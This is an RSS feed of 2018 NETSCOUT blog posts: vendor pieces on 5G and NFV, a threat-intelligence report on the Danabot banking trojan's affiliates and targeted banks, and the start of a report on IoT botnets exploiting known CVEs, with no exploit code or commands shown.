<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0" xml:base="http://localhost:7996/">
  <channel>
    <title>NETSCOUT Blogs</title>
    <link>http://localhost:7996/</link>
    <description/>
    <language>en</language>
    <atom:link rel="self" href="http://localhost:7996/full-blogs-2018.xml"/>
<lastBuildDate>Mon, 07 Nov 2022 21:26:35 -0500</lastBuildDate>
<pubDate>Thu, 27 Dec 2018 15:24:08 -0500</pubDate>

    <item>
  <title>NETSCOUT Predicts: 5G Trends for 2019</title>
  <link>http://localhost:7996/blog/5G-trends-predictions-2019</link>
  <description>There’s no doubt that the low latency, high bandwidth of 5G will be a game-changer in today’s rapidly transforming digital world. However, service providers need to be smart when it comes to planning and rolling out this multimillion investment.</description>
  <content:encoded><![CDATA[<p>There’s no doubt that the low latency, high bandwidth of 5G will be a game-changer in today’s rapidly transforming digital world. However, service providers need to be smart when it comes to planning and rolling out this multimillion investment. &nbsp;Our 5G experts have a few predictions to help them successfully navigate the journey in 2019.</p>

<p>&nbsp;<br />
<strong>Prediction 1: 5G will drive virtualization in 2019</strong><br />
Momentum is building behind 5G, and the US and South Korea are leading the charge with the rollout of the first commercial networks. Trials are taking place in every major market worldwide, and Verizon and Samsung have just announced plans to launch a 5G handset in early 2019. Expectations for 5G are high – the next-generation mobile standard will underpin mission-critical processes and innovations, including telemedicine, remote surgery, and even driverless cars. However, vast sums of money will need to be spent on network infrastructure before any of this can happen, and it's the mobile and fixed carriers who will be expected to foot the bill. This is compounded by the fact that many of the aforementioned 5G use cases have yet to be defined, so carriers are being asked to gamble on an uncertain future.&nbsp;</p>

<p>So, what will the 5G future look like and what will it take to get us there?<br />
One thing is for certain - 5G will drive network virtualization. In 2019, we will see an increasing number of carriers commit to deploying virtualized network infrastructure to support 5G applications and services. Without virtualization, it will be ‘virtually’ impossible to deliver 5G. This is because 5G requires virtualization both at the network core, and—critically—at the network edge. Puns aside, the days of building networks to support single use cases such as mobile voice and data or home broadband are behind us. If 5G is to become a reality, then the networks of the future will need to be smart and automated, with the ability to switch between different functions to support a range of use cases.<br />
<br />
-- John English, Director of Marketing, Service Provider Solutions, NETSCOUT</p>

<p><strong>Prediction 2: 5G just can’t ‘contain’ itself&nbsp;</strong><br />
As virtualized network architectures are rapidly adopted to support 5G in 2019, we expect to see containers emerge as the de-facto platform to run new applications and workloads.</p>

<p>The excitement around 5G is building as we hear more news about network deployments, trials and handsets. However, one 5G-related issue that hasn’t yet been crystallized is what form 5G software and innovations will take, and how these new services and applications will be deployed into the network. Unlike 4G/LTE network infrastructure, the architectures that support 5G are virtualized and cloud-based, so the smart money is on application developers, mobile operators, and equipment vendors using microservices, and in particular containers, to drive 5G evolution.</p>

<p>It makes sense to use containers to support 5G as they will provide operators with a flexible and easier to use platform to build, test, and deploy applications that is now also becoming more secure. This is vital for the development of 5G services at a time when the use cases for 5G are still being defined. Operators will need to be in a position to spin up services as needed to support different use cases, and by using containers it will be possible to serve customers quickly and efficiently.&nbsp;<br />
<br />
--John English, Director of Marketing, Service Provider Solutions, NETSCOUT</p>

<p><strong>Prediction 3: 2019 - The year carriers come to grips with 5G security</strong><br />
The benefits of 5G are clear: The new communications standard will offer carriers and their enterprise customers faster network speeds and performance, ultra-low latency, and greater efficiencies. General discussion around carrier trials and deployments tends to focus on increased speeds and the new innovations that 5G will enable, but security rarely comes up. That’s all about to change with 5G security set to become a big issue for the industry and a major talking point in 2019.&nbsp;</p>

<p>To date, it appears that 5G security has almost been treated as an afterthought rather than a critical aspect of network development. However, behind the scenes this is an issue that the carriers take very seriously. The situation for carriers has altered dramatically, because in a 5G domain, the attack surface becomes much greater. Consequently, the number of opportunities for malicious players to exploit vulnerabilities increases.</p>

<p>This is partly due to the adoption of virtualized network infrastructures that will allow carriers to scale and meet the demands of 5G, but also because 5G networks will be configured to support a wide variety of industrial and business use cases. This means that going forward, carriers will be responsible for managing mission-critical systems and devices in addition to handling high volumes of sensitive data. In a 5G environment, there will be a strong emphasis on securing smart factories, automated production lines, and fleets of driverless cars. The network security stakes have suddenly got a lot higher.<br />
<br />
-- Heather Broughton, Sr. Director of Service Provider Marketing, NETSCOUT</p>

<p><strong>Prediction 4: Operators will ‘scale or fail’ to meet the 5G demand in 2019</strong><br />
5G will be faster, smarter, and more efficient than 4G, but in order to meet demand and to support new architectures, networks will have to scale. While most of the scale in the core network will be cloud and software-based, there will still be a need for hardware and equipment at the network edge, and in a 5G environment there will be a lot more equipment. In fact, the number of cell sites will increase dramatically to support and propagate the higher frequency bands that will transmit 5G data traffic over the air. This is when network management tools will come into their own. In 2019, we will see the deployment of automated networks driven by software and controlled by virtual machines and artificial intelligence.</p>

<p>Network automation and orchestration are by-products of virtualization and will add another layer of complexity. However, they are also integral to the rollout and sustainability of 5G networks, particularly as network topologies will change to accommodate a combination of small cell and macro cell sites. Small cells in particular will form the bulk of the new RAN (radio area network) and they are expected to increase cellular networks threefold. If network engineers think they already have enough issues to deal with maintaining 4G/LTE networks, then they may be in for a shock as 5G networks are gradually rolled out. In fact, without having total visibility of these more complex and expansive networks, 5G in the RAN is going to become extremely difficult to manage.&nbsp;<br />
<br />
-- Heather Broughton, Sr. Director of Service Provider Marketing, NETSCOUT<br />
&nbsp;</p>

<h2>&nbsp;</h2>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/5G_shutterstock_1038753427_1600x900.jpg" length="359150" type="image/jpeg"/>
    <guid isPermaLink="false">df661c0b-25ec-45e5-a2a9-91bc3a5c7ef9</guid>
    <pubDate>Thu, 27 Dec 2018 15:24:08 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Danabot's Travels, A Global Perspective</title>
  <link>http://localhost:7996/blog/asert/danabots-travels-global-perspective</link>
  <description>First discovered in May of 2018, Danabot is a Delphi written banking trojan that has been under active development throughout the year.</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW110697845">First discovered in May of 2018, </span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW110697845">Danabot</span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW110697845"> is a</span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW110697845"> Delphi written banking trojan</span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW110697845"> that has </span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW110697845">been under</span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW110697845"> active development throughout the year. This malware's early success can be attributed to its modular structure and mature distribution system. Throughout the year, NETSCOUT Threat Intelligence has observed the growth in distribution and global coverage of </span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW110697845">Danabot</span></span><span class="TextRun SCXW110697845" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW110697845">.</span></span></p>

<p><strong><em>NOTE:</em></strong><em> NetScout AED/APS enterprise security products detect, and block activity related to Danabot using our ATLAS Intelligence Feed (AIF).</em></p>

<h2>Key Findings</h2>

<ul><li><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW17117757">Danabot</span></span><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW17117757"> is an actively supported banking trojan </span></span><strong><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW17117757">steadily approaching the sophistication of mature crimeware</span></span></strong><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW17117757"> families such as </span></span><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW17117757">Dridex</span></span><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW17117757"> and </span></span><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW17117757">Trickbot</span></span><span class="TextRun SCXW17117757" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW17117757">.</span></span></li>
	<li><span class="TextRun SCXW29421459" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW29421459">Danabot</span></span><span class="TextRun SCXW29421459" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW29421459"> leverages a centralized command and control infrastructure that </span></span><strong><span class="TextRun SCXW29421459" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW29421459">allows third party actors as affiliates</span></span></strong><span class="TextRun SCXW29421459" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW29421459">. This is a proven model that we have seen work well with other banking trojans like the mature families noted previously.</span></span></li>
	<li><span class="TextRun SCXW151783894" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW151783894">Danabot’s</span></span><span class="TextRun SCXW151783894" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW151783894"> affiliate program has </span></span><strong><span class="TextRun SCXW151783894" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW151783894">gradually expanded to target numerous geographical </span></span><span class="TextRun SCXW151783894" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW151783894">regions</span></span></strong><span class="TextRun SCXW151783894" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW151783894"> including: Australia, Austria, Canada, Germany, Italy, Poland and the United States</span></span><span class="TextRun SCXW151783894" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun CommentStart SCXW151783894">.</span></span></li>
</ul><h2>Overview of Danabot</h2>

<p><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW63683668">Danabot</span></span><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW63683668"> is a modular banking trojan that utilizes several DLL files to aid in credential theft using various mechanisms, most notably web injects. In addition to credential theft and information stealing operations, </span></span><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW63683668">Danabot</span></span><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW63683668"> supports remote access from an infected system to malicious actors through the VNC and RDP modules distributed from the command and control server. Danabot is typically distributed by spam email through malicious documents or </span></span><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW63683668">Hancitor</span></span><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW63683668"> malware. Once the initial </span></span><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="SpellingError SCXW63683668">Danabot</span></span><span class="TextRun SCXW63683668" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW63683668"> payload (loader) is executed it will reach out to the C2 to download additional DLL modules which can perform credential theft or remote access tasks.</span></span>  </p>

<h2>Command and Control Centralization</h2>

<p>Danabot uses a centralized command and control (C2) infrastructure which appears to be copied across various servers. All malware samples connect to the same set of C2 IP addresses which are presumably managed by one entity as opposed to each Danabot actor managing their own C2 infrastructure. We observed this centralization becoming a trend among mature information stealing and banking type malware families. When an infected machine connected to the Danabot C2 it provides information about its affiliate ID allowing the C2 to provide the machine the correct payloads, configuration files, and web injects. Samples with the same affiliate ID can have different hardcoded C2 IPs, however in our observations each affiliate ID will get the same data despite which C2 it connects to. This means that the data for each affiliate ID is hosted on every Danabot C2 server. Our research identified the same webinject targets and configuration files being used for multiple affiliate IDs. This overlap suggests the affiliates of Danabot may be separate third-party entities who may have the same targets.  </p>

<h2>New Affiliate IDs</h2>

<p><span class="TextRun SCXW167832767" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW167832767">As of December 14</span></span><span class="TextRun SCXW167832767" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW167832767">th</span></span><span class="TextRun SCXW167832767" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW167832767">, we identified 12 different affiliate IDs targeting various regions and sectors globally. This included 3 additional affiliates (10, 14, 15) added since the last public reporting in September by <a href="https://www.proofpoint.com/us/threat-insight/post/danabot-gains-popularity-and-targets-us-organizations-large-campaigns">Proofpoint</a>. The following sections break down these affiliate IDs into clusters to showcase regional targeting. </span></span><strong><span class="TextRun SCXW167832767" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW167832767">Appendix A</span></span></strong><span class="TextRun SCXW167832767" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW167832767"> represents the primary websites targeted by </span><span class="SpellingError SCXW167832767">Danabot</span><span class="NormalTextRun SCXW167832767">.</span></span></p>

<h3>Affiliate 10</h3>

<p><span class="NormalTextRun SCXW80539393">Although we observed numerous malware samples coded with the affiliate ID “10”, we have been unable to recover live C2 communications to retrieve infects and confirmation files. This could mean the affiliate ID is no longer being serviced by the </span><span class="SpellingError SCXW80539393">Danabot</span><span class="NormalTextRun SCXW80539393"> operators.</span></p>

<h3>Affiliate 14</h3>

<p>Affiliate ID “14” first surfaced in early November and we observed it in more than 50 malware samples. The C2 communication for this affiliate ID contained the following configuration, consistent with other <a href="https://www.proofpoint.com/us/threat-insight/post/danabot-gains-popularity-and-targets-us-organizations-large-campaigns">campaigns</a> we are tracking:</p>

<ul><li>BitVideo</li>
	<li>KeyBit</li>
	<li>PostWFilter</li>
	<li>BitFilesZ</li>
</ul><p>No webinjects were captured during our observations of affiliate ID ”14” traffic. However, the configuration files offer the capability to steal cryptocurrency wallets, files, and account credentials.</p>

<h3>Affiliate 15</h3>

<p><span class="NormalTextRun SCXW31185158">Affiliate ID “15” started appearing in late November and is the most recent affiliate discovered. We managed to collect configuration files and </span><span class="SpellingError SCXW31185158">webinjects</span><span class="NormalTextRun SCXW31185158"> from the C2 servers. These files and infects contained different names compared to those of previous affiliate IDs. The injects retrieved primarily targeted Polish banking institutions, but also one U.S. financial organization.</span>  </p>

<h2><span class="TextRun SCXW163561182" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW163561182">Current Affiliate ID Distribution by Region</span></span></h2>

<p><img alt="Danabot Distribution Map" data-entity-type="file" data-entity-uuid="d1278b12-1dfb-4e42-87c4-89016e331360" src="http://localhost:7996/sites/default/files/inline-images/Danabot_DistributionMap-1024x559.png" /></p>

<table border="2" style="text-align: center;height: 152px" width="642"><tbody><tr><td style="text-align: center"><strong>Affiliate ID</strong></td>
			<td width="269"><strong>Targeted Countries</strong></td>
			<td width="136"><strong>First Seen</strong></td>
		</tr><tr><td width="102"><span style="color: #93d500"><strong>3</strong></span></td>
			<td width="269"><span style="color: #93d500"><strong>Austria</strong></span> <span style="color: #93d500"><strong>Italy</strong></span></td>
			<td width="136"><span style="color: #93d500"><strong>September 06, 2018</strong></span></td>
		</tr><tr><td width="102"><strong>4</strong></td>
			<td width="269"><strong>Australia</strong></td>
			<td width="136"><strong>September 24, 2018</strong></td>
		</tr><tr><td width="102"><span style="color: #93d500"><strong>5</strong></span></td>
			<td style="text-align: left" width="269">
			<p style="text-align: center"><span style="color: #93d500"><strong>None</strong></span></p>
			</td>
			<td width="136"><span style="color: #93d500"><strong>September 18, 2018</strong></span></td>
		</tr><tr><td width="102"><strong>8</strong></td>
			<td width="269"><strong>Canada</strong> <strong>United States</strong></td>
			<td width="136"><strong>September 11, 2018</strong></td>
		</tr><tr><td width="102"><span style="color: #93d500"><strong>9</strong></span></td>
			<td width="269"><span style="color: #93d500"><strong>Austria</strong></span> <span style="color: #93d500"><strong>Germany</strong></span> <span style="color: #93d500"><strong>Italy</strong></span> <span style="color: #93d500"><strong>Poland</strong></span> <span style="color: #93d500"><strong>United States</strong></span></td>
			<td width="136"><span style="color: #93d500"><strong>September 15, 2018</strong></span></td>
		</tr><tr><td width="102"><strong>10</strong></td>
			<td style="text-align: left" width="269">
			<p style="text-align: center"><strong>None</strong></p>
			</td>
			<td width="136"><strong>October 29, 2018</strong></td>
		</tr><tr><td width="102"><span style="color: #93d500"><strong>11</strong></span></td>
			<td width="269"><span style="color: #93d500"><strong>None</strong></span></td>
			<td width="136"><span style="color: #93d500"><strong>September 26, 2018</strong></span></td>
		</tr><tr><td width="102"><strong>12</strong></td>
			<td width="269"><strong>Australia</strong></td>
			<td width="136"><strong>September 29, 2018</strong></td>
		</tr><tr><td width="102"><span style="color: #93d500"><strong>13</strong></span></td>
			<td width="269"><span style="color: #93d500"><strong>Germany</strong></span></td>
			<td width="136"><span style="color: #93d500"><strong>September 29, 2018</strong></span></td>
		</tr><tr><td width="102"><strong>14</strong></td>
			<td style="text-align: left" width="269">
			<p style="text-align: center"><strong>None</strong></p>
			</td>
			<td width="136"><strong>November 08, 2018</strong></td>
		</tr><tr><td width="102"><span style="color: #93d500"><strong>15</strong></span></td>
			<td width="269"><span style="color: #93d500"><strong>Poland</strong></span> <span style="color: #93d500"><strong>United States</strong></span></td>
			<td width="136"><span style="color: #93d500"><strong>November 21, 2018</strong></span></td>
		</tr><tr><td width="102"><strong>20</strong></td>
			<td width="269"><strong>None</strong></td>
			<td width="136"><strong>September 29, 2018</strong></td>
		</tr></tbody></table><p> </p>

<h2><span class="TextRun SCXW75507024" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW75507024">Affiliate ID Timeline</span></span></h2>

<p><img alt="Danabot Timeline" data-entity-type="file" data-entity-uuid="91bc5758-acb4-40e3-9052-cdf694c566fd" src="http://localhost:7996/sites/default/files/inline-images/Danabot_Timeline_Update-1024x442.png" /></p>

<h2>Conclusion</h2>

<p><span class="SpellingError SCXW11486675">Danabot</span><span class="NormalTextRun SCXW11486675"> is an active banking trojan that has adopted a centralized command and control infrastructure to provide its services for third party actors. We continue to see this malware operation expanding its global coverage around the globe. Based on the overlap in targeting between various affiliate IDs, </span><span class="SpellingError SCXW11486675">Danabot</span><span class="NormalTextRun SCXW11486675"> appears to have multiple third parties using their platform. The modular nature of </span><span class="SpellingError SCXW11486675">Danabot</span><span class="NormalTextRun SCXW11486675">, the centralized infrastructure, and increasing number of affiliate IDs suggest this operation is streamlined, well-managed, and likely to grow beyond the seven countries currently impacted.</span>  </p>

<h2><span class="TextRun SCXW158816776" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW158816776">Appendix A: Domains/URLs Targeted by </span><span class="SpellingError SCXW158816776">Danabot</span></span></h2>

<p><span class="TextRun SCXW132683403" lang="EN-US" xml:lang="EN-US" xml:lang="EN-US"><span class="NormalTextRun SCXW132683403">This is a list of URLs observed in captured web injects and configuration files</span></span></p>

<ul><li>.it
	<ul><li>unicredit.it</li>
		<li>bancagenerali.it</li>
		<li>banking4you.it</li>
		<li>credit-agricole.it</li>
		<li>unipolbanca.it</li>
		<li>credem.it</li>
		<li>inbank.it</li>
		<li>relaxbanking.it</li>
		<li>Tim.it</li>
		<li>credem.it</li>
		<li>bancaeuro.it</li>
	</ul></li>
	<li>.pl
	<ul><li>ingbank.pl</li>
		<li>neobank24.pl</li>
		<li>centrum24.pl</li>
		<li>ingbusinessonline.pl</li>
		<li>aliorbank.pl</li>
		<li>ideabank.pl</li>
		<li>pocztowy24biznes.pl</li>
		<li>bosbank24.pl</li>
		<li>credit-agricole.pl</li>
		<li>sgcib.pl</li>
		<li>cui.pl</li>
		<li>bgzbnpparibas.pl</li>
		<li>ipko.pl</li>
		<li>ebusinessbank.db-pbc.pl</li>
		<li>e25.pl</li>
		<li>e-skok.pl</li>
		<li>t-mobilebankowe.pl</li>
	</ul></li>
	<li>.at
	<ul><li>sparkasse.at</li>
		<li>raiffeisen.at</li>
	</ul></li>
	<li>.com/.net
	<ul><li>raiffeisenpolbank.com</li>
		<li>chebanca.net</li>
		<li>Intesasanpaolo.com</li>
		<li>bittrex.com</li>
		<li>bitbay.net</li>
		<li>poloniex.com</li>
		<li>citidirect.com</li>
		<li>ubibanca.com</li>
	</ul></li>
	<li>.au
	<ul><li>commbank.com.au</li>
	</ul></li>
	<li>.de
	<ul><li>deutsche-bank.de</li>
		<li>sparda.de</li>
		<li>commerzbank.de</li>
		<li>comdirect.de</li>
		<li>berliner-bank.de</li>
		<li>norisbank.de</li>
		<li>targobank.de</li>
	</ul></li>
	<li>.ch
	<ul><li>bluewin.ch</li>
	</ul></li>
</ul>]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Danabot_TitleImage1-1024x465.png" length="515516" type="image/png"/>
    <guid isPermaLink="false">7bfc8a7a-eece-414e-97e2-b42779fa2b97</guid>
    <pubDate>Wed, 19 Dec 2018 10:00:48 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>The Need for Visualization in Mobile Operator Virtualization</title>
  <link>http://localhost:7996/blog/need-visualization-mobile-operator-virtualization</link>
  <description>In order to stay competitive, service providers are coming to recognize the enormous potential for NFV to transform their networks, drive cost efficiencies, and empower new services.</description>
  <content:encoded><![CDATA[<p>Service providers are under siege. Born-in-the-cloud, over-the-top (OTT) mobile players, such as Skype and WhatsApp, are eating into traditional service provider voice and messaging revenue. According to a new study from <a href="https://www.businesswire.com/news/home/20180710005090/en/Juniper-Research-Mobile-Voice-Revenues-Fall-157">Juniper Research</a>, operator-billed mobile voice revenues are set to fall by almost half over the next five years, from $354 billion to $197 billion, as a result of the widespread adoption of OTT messaging and VoIP services.</p>

<h3>Turning to NFV and SDN</h3>

<p>To combat this trend and remain competitive in a world of unlimited packages and data-driven business models, service providers have begun shifting functions to the cloud to achieve the agility they need to keep pace with OTT providers and to create the cost savings needed for future investments in their networks.</p>

<p>Many operators are turning to <a href="https://www.netscout.com/blog/whats-sdn-and-nfv">network functions virtualization (NFV) and software-defined networking (SDN)</a> as a means of meeting digital transformation pressures. Virtualization offers a viable path to greater efficiencies and significant cost savings, as well as the ability to launch services ‘on the fly’ and support a broad range of applications.</p>

<p>At the same time, these new virtualized networks are also increasingly complex, presenting operators with a wide range of new challenges. Once virtual network functions such as IMS and VoLTE are deployed, and new infrastructure such as cloud-RAN and Mobile Edge Computing (MEC), which will be required to support 5G and Internet-of-Things (IoT) requirements, operators will need visibility into both public and private cloud and all points in between. This network visibility will be essential for identifying and resolving past, present and future problems.</p>

<p>With mission-critical services - ranging from everyday business and consumer calls and data sessions to more complex needs of autonomous vehicles, power plant sensors and remote heart monitors - delivery of seamless connectivity will be vital. Even a brief moment of downtime could have devastating consequences.</p>

<p>To ensure reliable connectivity, service providers need real-time, pervasive visibility that delivers insights into both traditional “North/South” traffic flows and new “East/West” traffic of multi-domain, multi-technology networks. That visibility must scale as one of the major challenges mobile operators face is the sheer volume of data being processed. They need to quickly and efficiently identify the right information amidst all the noise in order to optimize the subscriber experience. This is where <a href="https://www.netscout.com/blog/what-smart-data-how-does-it-help" title="What is Smart Data? How Does it Help?">smart data</a> comes into play.</p>

<h3>The Importance of Smart Data</h3>

<p>By extracting the most critical information from all the IP data that crosses the network in real time, smart data provides operators with the actionable intelligence they need to identify issues and optimize their infrastructure in keeping with traffic demands. Smart data has the added benefit of being particularly cost-effective when used with virtualized instrumentation that can be pervasively deployed throughout the network.</p>

<p>In order to stay competitive, service providers are coming to recognize the enormous potential for NFV to transform their networks, drive cost efficiencies, and empower new services. As operators continue to virtualize their network elements, and move network infrastructure closer to the edge, harnessing NFV and cloud to deliver new services and support the demands of 5G and the IoT, the need for visibility becomes abundantly clear. With the ability to see, secure, and optimize their network using smart data, mobile operators can take an important step in reclaiming ground lost to OTT service providers.</p>

<p>To learn more visit the&nbsp;<a href="https://www.netscout.com/nfv-smarter-video/?ls=PR-MKTG&amp;lsd=blog-121718-1">NETSCOUT NVF Smarter page</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/Virtualization1200x480.jpg" length="248640" type="image/jpeg"/>
    <guid isPermaLink="false">2ea021d1-1eaa-460d-83e2-841877d4896a</guid>
    <pubDate>Tue, 18 Dec 2018 15:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Fast &amp; Furious IoT Botnets: Regifting Exploits</title>
  <link>http://localhost:7996/blog/asert/fast-furious-iot-botnets-regifting-exploits</link>
  <description>Internet of Things (IoT) botnet authors are adapting to a shift in more secure IoT devices, which has diverted attacker’s focus to exploiting vulnerabilities in IoT devices, either to supplement brute-forcing factory default passwords or completely supplant it.</description>
  <content:encoded><![CDATA[<p><strong>Executive Summary</strong> Internet of Things (IoT) botnet authors are adapting to a shift in more secure IoT devices, which has diverted attacker’s focus to exploiting vulnerabilities in IoT devices, either to supplement brute-forcing factory default passwords or completely supplant it. As IoT device security is still in its infancy, it’s not uncommon to find basic vulnerabilities like command injection. In November 2018, our honeypot observed several older IoT vulnerabilities being used as a means to deliver malware. Our data indicates it takes less than one day before a new IoT device is hit with exploitation attempts against known vulnerabilities, and less then 5 minutes before we see brute force login attempts using default IoT credentials (<a href="https://asert.arbornetworks.com/dipping-into-the-honeypot/">Dipping Into The Honeypot</a>.)</p>

<p><strong><em>NOTE: </em></strong><em>Customers using NETSCOUT APS/AED products receive early warnings about DDoS attack targeting seen in our honeypots through the ATLAS Intelligence Feed (AIF) service.</em> <strong>Key Findings</strong></p>

<ul><li>IoT botnet authors are <strong>increasingly adding exploitation of IoT related vulnerabilities to their arsenal</strong> in addition to the usual brute-forcing routing. In some cases attackers will complement the brute-forcing with attempts to exploit known vulnerabilities.</li>
	<li><strong>IoT related vulnerabilities are valid attack vectors for longer periods of time</strong> due to the difficulties and slow cadence of patching IoT devices.</li>
	<li>Our data collection revealed <strong>it takes less than five minutes from when IoT device comes online to when the first brute-forcing attempts begin. </strong>Within twenty-four hours, those same devices begin receiving exploitation attempts against known vulnerabilities.</li>
</ul><p><strong>Details</strong> The use of IoT based vulnerabilities has helped botnet authors increase the number of devices within their botnets with little effort. A great example of this are the numerous Mirai variants which included IoT specific vulnerabilities. Based on data from our honeypot, we can see a quick turnaround time from when a vulnerability is made public to when botnet authors integrate them into their botnet. We see a mixture of new and older IoT related vulnerabilities against out honeypots in a constant stream. There are two main reasons why we still see older IoT vulnerability exploitation attempts. First, IoT devices can sit on a shelf for weeks on end before being purchased. If a security update is released for the device, it won’t be applied to these devices until the software is updated. Thus, leaving the device vulnerable out of the box. Due to this, when an IoT device is plugged in, it can be exploited quickly. Our honeypot data shows it only takes a few minutes after the device is connected to the Internet before someone is scanning it and attempting brute-force logins. The second reason is the agonizingly slow rate at which IoT devices receive patches. These devices are thought of as “set and forget” type of devices. When’s the last time you updated your IP camera or cable modem? Looking at data from our honeypots during the month of November, we saw a plethora of activity related to a Hadoop YARN exploit described in “<a href="https://asert.arbornetworks.com/mirai-not-just-for-iot-anymore/">Mirai: Not Just For IoT Anymore</a>”. Within the onslaught of Hadoop YARN requests, we observed a mix of older IoT related vulnerabilities. These vulnerabilities included <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8361">CVE-2014-8361</a>,  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2051">CVE-2015-2051</a>, <a href="https://www.exploit-db.com/exploits/43414">CVE-2017-17215</a> and <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10561">CVE-2018-10561</a>.  <strong>Figure 1</strong> shows the number of unique sources which attempted to exploit these vulnerabilities against our honeypots during the month of November.</p>

<p><img alt="Older IoT Vulnerabilities" src="https://www.netscout.com/sites/default/files/inline-images/fig1-nov-2018-768x509.png" /></p>

<p style="text-align: center;"><strong>Figure 1: Older IoT Vulnerabilities attempts for November 2018</strong></p>

